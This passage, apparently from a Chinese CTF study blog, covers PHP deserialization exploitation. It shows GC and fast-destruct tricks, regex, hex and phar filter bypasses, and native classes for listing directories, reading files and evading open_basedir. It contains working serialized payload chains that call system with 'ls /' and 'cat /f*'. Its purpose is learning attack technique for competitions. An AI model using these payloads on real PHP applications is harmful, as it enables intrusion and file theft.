<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">errorr0</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$num</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;num = <span class="keyword">new</span> <span class="title function_ invoke__">errorr1</span>();</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">errorr1</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$err</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;err = <span class="keyword">new</span> <span class="title function_ invoke__">errorr2</span>();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">errorr2</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$err</span> = <span class="string">&quot;phpinfo();&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">errorr0</span>();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">array</span>(<span class="number">0</span>=&gt;<span class="variable">$a</span>,<span class="number">1</span>=&gt;<span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$c</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>明显</p>
<p>就加了一行代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$c = array(0=&gt;$a,1=&gt;NULL);</span><br><span class="line"></span><br><span class="line">$c = array(0=&gt;$a,1=&gt;0);  然后再改一下 如下 也可以</span><br></pre></td></tr></table></figure>

<p>把目标对象赋给键为0，键为1赋值为<strong>NULL</strong>。为什么要这么做，因为这样操作后，得到的字符串为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:2:&#123;i:0;O:7:&quot;errorr0&quot;:1:&#123;s:3:&quot;num&quot;;O:7:&quot;errorr1&quot;:1:&#123;s:3:&quot;err&quot;;O:7:&quot;errorr2&quot;:1:&#123;s:3:&quot;err&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125;&#125;i:1;N;&#125;</span><br><span class="line"></span><br><span class="line">a:2:&#123;i:0;O:7:&quot;errorr0&quot;:1:&#123;s:3:&quot;num&quot;;O:7:&quot;errorr1&quot;:1:&#123;s:3:&quot;err&quot;;O:7:&quot;errorr2&quot;:1:&#123;s:3:&quot;err&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125;&#125;i:1;i:0;&#125;  这是结果 但是只有还是不行  还要再改一下</span><br><span class="line">a:2:&#123;i:0;O:7:&quot;errorr0&quot;:1:&#123;s:3:&quot;num&quot;;O:7:&quot;errorr1&quot;:1:&#123;s:3:&quot;err&quot;;O:7:&quot;errorr2&quot;:1:&#123;s:3:&quot;err&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125;&#125;i:0;i:0;&#125;   将1改成0 就可以了 原理是一样的</span><br></pre></td></tr></table></figure>

<blockquote>
<p>第一个a为数组，2为数组中键有两个 i &#x3D; 0以及 i &#x3D; 1</p>
<p>重点重点重点，虽然有两个键i &#x3D; 0对应的是我们目标对象，i &#x3D; 1是NULL，如果这个时候我们做一件坏事，把i 本应该等于 1修改为 i &#x3D; 0。那不就是把i &#x3D; 0指向NULL了吗？然后就实现了GC回收。</p>
</blockquote>
<p>所以最后我们修改后的字符串为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:2:&#123;i:0;O:7:&quot;errorr0&quot;:1:&#123;s:3:&quot;num&quot;;O:7:&quot;errorr1&quot;:1:&#123;s:3:&quot;err&quot;;O:7:&quot;errorr2&quot;:1:&#123;s:3:&quot;err&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125;&#125;i:0;N;&#125;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641630ea11df.png" alt="image-20240312202655182"></p>
<p>成功</p>
<p>GC回收机制的利用需要修改字符串中的数据，如果phar反序列化+GC的话就还需要额外修改phar文件的签名，如果遇到的话就需要在修改序列化字符串后再对其进行加密得到的数据替换原本的签名。</p>
<h2 id="bypass绕过"><a href="#bypass绕过" class="headerlink" title="bypass绕过"></a>bypass绕过</h2><h3 id="wakeup绕过-1"><a href="#wakeup绕过-1" class="headerlink" title="__wakeup绕过"></a>__wakeup绕过</h3><p>见上文</p>
<h3 id="destruct绕过"><a href="#destruct绕过" class="headerlink" title="__destruct绕过"></a>__destruct绕过</h3><p>见上文 GC强制回收</p>
<p>快速触发__destruct</p>
<p>Fast destruct</p>
<p>1.修改序列化数字元素个数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:5:&quot;Start&quot;:1:&#123;s:6:&quot;errMsg&quot;;O:6:&quot;Crypto&quot;:1:&#123;s:3:&quot;obj&quot;;O:7:&quot;Reverse&quot;:1:&#123;s:4:&quot;func&quot;;O:3:&quot;Pwn&quot;:1:&#123;s:3:&quot;obj&quot;;O:3:&quot;Web&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:4:&quot;ls /&quot;;&#125;&#125;&#125;&#125;&#125;</span><br><span class="line">改成</span><br><span class="line">O:5:&quot;Start&quot;:2:&#123;s:6:&quot;errMsg&quot;;O:6:&quot;Crypto&quot;:1:&#123;s:3:&quot;obj&quot;;O:7:&quot;Reverse&quot;:1:&#123;s:4:&quot;func&quot;;O:3:&quot;Pwn&quot;:1:&#123;s:3:&quot;obj&quot;;O:3:&quot;Web&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:4:&quot;ls /&quot;;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641a0dd13fd7.png" alt="image-20240205180429122"></p>
<p>O:5:”Start”:2:{s:6:”errMsg”;O:6:”Crypto”:1:{s:3:”obj”;O:7:”Reverse”:1:{s:4:”func”;O:3:”Pwn”:1:{s:3:”obj”;O:3:”Web”:2:{s:4:”func”;s:6:”system”;s:3:”var”;s:7:”cat &#x2F;f*”;}}}}}</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641630ea1d7a.png" alt="image-20240205180917410"></p>
<p>2.去掉序列化尾部 }</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:5:&quot;Start&quot;:1:&#123;s:6:&quot;errMsg&quot;;O:6:&quot;Crypto&quot;:1:&#123;s:3:&quot;obj&quot;;O:7:&quot;Reverse&quot;:1:&#123;s:4:&quot;func&quot;;O:3:&quot;Pwn&quot;:1:&#123;s:3:&quot;obj&quot;;O:3:&quot;Web&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:4:&quot;ls /&quot;;&#125;&#125;&#125;&#125;&#125;</span><br><span class="line">改成</span><br><span class="line">O:5:&quot;Start&quot;:1:&#123;s:6:&quot;errMsg&quot;;O:6:&quot;Crypto&quot;:1:&#123;s:3:&quot;obj&quot;;O:7:&quot;Reverse&quot;:1:&#123;s:4:&quot;func&quot;;O:3:&quot;Pwn&quot;:1:&#123;s:3:&quot;obj&quot;;O:3:&quot;Web&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:4:&quot;ls /&quot;;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641630e5aba2.png" alt="image-20240205181044938"></p>
<p>O:5:”Start”:1:{s:6:”errMsg”;O:6:”Crypto”:1:{s:3:”obj”;O:7:”Reverse”:1:{s:4:”func”;O:3:”Pwn”:1:{s:3:”obj”;O:3:”Web”:2:{s:4:”func”;s:6:”system”;s:3:”var”;s:7:”cat &#x2F;f*”;}}}}</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641630eda87b.png" alt="image-20240205181123821"></p>
<p>详见newstar web week4 morefast</p>
<h3 id="正则绕过"><a href="#正则绕过" class="headerlink" title="正则绕过"></a>正则绕过</h3><p>如preg_match(‘&#x2F;^O:\d+&#x2F;‘)匹配序列化字符串是否是对象字符串开头</p>
<ul>
<li><code>利用加号绕过（注意在url里传参时+要编码为%2B）。</code></li>
<li><code>利用数组对象绕过，如 serialize(array($a)); a为要反序列化的对象(序列化结果开头是a，不影响作为数组元素的$a的析构)。</code></li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a.PHP_EOL;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">match</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^O:\d+/&#x27;</span>,<span class="variable">$data</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;nonono!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="comment">// +号绕过</span></span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;O:4&#x27;</span>,<span class="string">&#x27;O:+4&#x27;</span>, <span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="keyword">match</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="comment">// 将对象放入数组绕过 serialize(array($a));</span></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;a:1:&#123;i:0;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#125;&#x27;</span>);</span><br></pre></td></tr></table></figure>





<h3 id="引用绕过"><a href="#引用绕过" class="headerlink" title="引用绕过"></a>引用绕过</h3><p>见上文</p>
<h3 id="16进制绕过字符的过滤"><a href="#16进制绕过字符的过滤" class="headerlink" title="16进制绕过字符的过滤"></a>16进制绕过字符的过滤</h3><p>序列字符串中表示字符类型的s大写时，会被当成16进制解析</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;success&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/username/&#x27;</span>, <span class="variable">$data</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;nonono!!!&lt;/br&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 未作处理前，会被waf拦截</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">check</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">// 将小s改为大S; 做处理后 \75是u的16进制， 成功绕过</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;S:8:&quot;\\75sername&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">check</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>



<h3 id="phar的绕过"><a href="#phar的绕过" class="headerlink" title="phar的绕过"></a>phar的绕过</h3><p>当环境限制了phar不能出现在前面的字符里。可以使用compress.bzip2:&#x2F;&#x2F;和compress.zlib:&#x2F;&#x2F;等绕过。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">compress.bzip://phar:///test.phar/test.txt</span><br><span class="line">compress.bzip2://phar:///test.phar/test.txt</span><br><span class="line">compress.zlib://phar:///home/sx/test.phar/test.txt</span><br></pre></td></tr></table></figure>

<p>也可以利用其他协议</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=phar://phar.phar</span><br></pre></td></tr></table></figure>





<p>GIF格式验证可以通过在文件头部添加GIF89a绕过。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> $phar-&gt;setStub(“GIF89a”.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub</span><br><span class="line">//生成一个phar.phar，修改后缀名为phar.gif</span><br></pre></td></tr></table></figure>





<p>过滤了__HALT_COMPILER()</p>
<p>1.<strong>将phar文件进行gzip压缩</strong> ，使用压缩后phar文件同样也能反序列化 (常用)</p>
<p>2.将phar的内容写进压缩包注释中，也同样能够反序列化成功，压缩为zip也会绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$phar_file = serialize($exp);</span><br><span class="line">echo $phar_file;</span><br><span class="line">$zip = new ZipArchive();</span><br><span class="line">$res = $zip-&gt;open(&#x27;1.zip&#x27;,ZipArchive::CREATE);</span><br><span class="line">$zip-&gt;addFromString(&#x27;crispr.txt&#x27;, &#x27;file content goes here&#x27;);</span><br><span class="line">$zip-&gt;setArchiveComment($phar_file);</span><br><span class="line">$zip-&gt;close();</span><br></pre></td></tr></table></figure>









<h2 id="原生类"><a href="#原生类" class="headerlink" title="原生类"></a>原生类</h2><h3 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h3><p>PHP 原生类指的是 PHP 内置的类，它们可以直接在 PHP 代码中使用且无需安装或导入任何库，相当于代码中的内置方法例如echo ，print等等可以直接调用，但是原生类就是可以就直接php中直接创建的类，我们可以直接调用创建对象，但是这些类中有的会有魔术方法，为此，我们可以创建原生类去利用其中的魔术方法来达到我们反序列化的利用。</p>
<p>通过代码直接获取原生类和相关魔术方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$classes</span> = <span class="title function_ invoke__">get_declared_classes</span>();</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$classes</span> <span class="keyword">as</span> <span class="variable">$class</span>) &#123;</span><br><span class="line">    <span class="variable">$methods</span> = <span class="title function_ invoke__">get_class_methods</span>(<span class="variable">$class</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$methods</span> <span class="keyword">as</span> <span class="variable">$method</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$method</span>, <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;__destruct&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__toString&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__wakeup&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__call&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__callStatic&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__get&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__set&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__isset&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__unset&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__invoke&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__set_state&#x27;</span>    // 可以根据题目环境将指定的方法添加进来, 来遍历存在指定方法的原生类</span><br><span class="line">        ))) &#123;</span><br><span class="line">            <span class="keyword">print</span> <span class="variable">$class</span> . <span class="string">&#x27;::&#x27;</span> . <span class="variable">$method</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>结果：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641631a7f108.png" alt="image-20240312220217278"></p>
<p>截不完</p>
<p>不同版本的PHP其中包含的原生类不同，为了使用到较全的php原生类，建议将php的版本调到7.0以上</p>
<h3 id="常用原生类使用"><a href="#常用原生类使用" class="headerlink" title="常用原生类使用"></a>常用原生类使用</h3><h4 id="DirectoryIterator"><a href="#DirectoryIterator" class="headerlink" title="DirectoryIterator()"></a>DirectoryIterator()</h4><p>使用DirectoryIterator()类可以遍历目录下的文件名</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line"><span class="variable">$dir</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="variable">$dir</span>);</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">&#125;<span class="comment">//不加__toString也可以，因为echo可以自动调用</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641631868f6f.png" alt="image-20240313195328587"></p>
<p>传入.&#x2F;就会查看到当前目录下的文件</p>
<p>同理使用..&#x2F;可以查看上级目录下的文件</p>
<p>使用绝对路径亦可以查看服务器指定目录下的文件目录</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641631a3cfa0.png" alt="image-20240313195050576"></p>
<p>foreach是遍历目录关键</p>
<p>没有foreach就只遍历第一个字符</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line"><span class="variable">$dir</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="variable">$dir</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/66416316804ac.png" alt="image-20240313195401536"></p>
<p>回显.htaccess的.</p>
<p>也可以使用glob和file协议读取文件内容</p>
<p>glob:&#x2F;&#x2F;*.php</p>
<h4 id="FilesystemIterator"><a href="#FilesystemIterator" class="headerlink" title="FilesystemIterator"></a>FilesystemIterator</h4><p>FilesystemIterator是继承于DirectoryIterator的类，两者作用和用法基本相同，区别为FilesystemIterator会显示文件的完整路径，而DirectoryIterator只显示文件名</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$dir</span>=<span class="keyword">new</span> <span class="built_in">FilesystemIterator</span>(<span class="string">&quot;./&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$dir</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$dir</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$f</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$dir</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$dir</span>-&gt;<span class="title function_ invoke__">current</span>().<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="comment">//是$dir不是$f</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第一个foreach是继承的DirectoryIterator()的魔术方法__toString,</p>
<p>而第二个foreach是FilesystemIterator的为了达成上一个foreach的效果的魔术方法current()</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641631ceee8d.png" alt="image-20240313200737925"></p>
<p>也可以使用glob协议</p>
<p><strong>在php4.3以后使用了<code>zend_class_unserialize_deny</code>来禁止一些类的反序列化，很不幸的是这两个原生类都在禁止名单当中</strong></p>
<h4 id="GlobIterator"><a href="#GlobIterator" class="headerlink" title="GlobIterator"></a>GlobIterator</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span>=<span class="keyword">new</span> <span class="built_in">GlobIterator</span>(<span class="string">&quot;*.php&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$dir</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$f</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>与之前两个类的作用和使用方法类似，不同点在于其行为类似于glob(),可以通过模式匹配来寻找文件路径（前两个需要利用glob:&#x2F;&#x2F;协议才可以模式匹配）</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/66416317e49f4.png" alt="image-20240313202150331"></p>
<h4 id="绕过open-basedir"><a href="#绕过open-basedir" class="headerlink" title="绕过open_basedir"></a>绕过open_basedir</h4><p>open_basedir限制目录：将PHP所能打开的文件限制在指定目录树，包括文件本身</p>
<p>使用DirectoryIterator()和FilesystemIterator的glob:&#x2F;&#x2F;协议可以无视open_basedir对目录的限制，可以用来列举出指定目录下的文件，使用GlobIterator也是一样的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;指定目录&#x27;</span>)；</span><br><span class="line"><span class="variable">$dir1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;1&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="variable">$dir1</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$f</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$dir2</span>= <span class="variable">$_GET</span>[<span class="string">&#x27;2&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">GlobIterator</span>(<span class="variable">$dir2</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$f</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h4 id="SplFileObject"><a href="#SplFileObject" class="headerlink" title="SplFileObject()"></a>SplFileObject()</h4><p>利用SplFileObject()进行文件内容的读取</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"><span class="variable">$context</span> = <span class="keyword">new</span> <span class="built_in">SplFileObject</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$context</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641631513ab3.png" alt="image-20240313200156343"></p>
<p>php文件要到源码中查看（ctrl U）</p>
<p>同理 没有foeach则只回显一行</p>
<p>绝对路径也可</p>
<p>也可：</p>
